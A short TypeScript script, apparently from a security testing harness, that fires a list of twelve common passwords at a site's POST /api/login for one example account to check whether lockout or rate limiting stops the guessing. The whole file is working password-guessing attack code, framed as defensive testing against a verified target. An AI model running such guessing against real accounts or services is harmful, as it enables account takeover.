// Credential stuffing: fire wrong passwords at POST /api/login. No lockout => cheap to try forever.
import { attackFetch, banner, requireVerifiedTarget } from "./_lib.ts";

const origin = requireVerifiedTarget();
banner("cred-stuff", origin);

const guesses = [
  "123456", "password", "qwerty", "letmein", "admin", "welcome", "monkey",
  "iloveyou", "dragon", "football", "password1", "abc123",
];

let tried = 0;
let blockedAt = 0;
let unauthorized = 0;

for (const pw of guesses) {
  const res = await attackFetch(`${origin}/api/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "alice.patel1@example.com", password: pw }),
  });
  tried++;
  if (res.status === 403 || res.status === 429) {
    blockedAt = tried;
    break;
  }
  if (res.status === 401) unauthorized++;
}

if (blockedAt) {
  console.log(`Blocked after ${blockedAt} login attempts (shield) — stuffing stopped.`);
} else {
  console.log(`Made ${tried} login attempts, got ${unauthorized} clean 401s, no lockout — stuffing is free.`);
}
